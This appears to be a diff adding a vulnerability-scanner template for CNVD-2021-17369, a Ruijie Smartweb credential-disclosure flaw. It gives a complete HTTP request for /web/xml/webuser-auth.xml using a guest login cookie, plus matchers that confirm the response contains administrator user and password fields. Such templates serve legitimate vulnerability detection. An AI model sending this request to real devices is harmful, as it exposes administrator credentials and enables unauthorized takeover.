@@ -1,0 +1,25 @@
+## id: CNVD-2021-17369
+## name: Ruijie Smartweb Management System Password Information Disclosure
+## author: hack007x
+## severity: high
+## tags: cnvd2021,cnvd,ruijie,disclosure,vuln
+## description: The wireless smartweb management system of Ruijie Networks Co., Ltd. has a logic flaw. An attacker can obtain the administrator account and password from a low-privileged user, thereby escalating the low-level privilege to the administrator's privilege.
+## cvss-score: 8.3
+## reference: https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369
+## verification: true
+
+GET /web/xml/webuser-auth.xml HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
+
+#@ condition: and
+#@ matcher: body contains "<userauth>"
+#@ matcher: body contains "<password>"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: f473e5e1f3149b72d1d94d4e7015e1caaf1e2edab92a59204d285670a7ebeed2
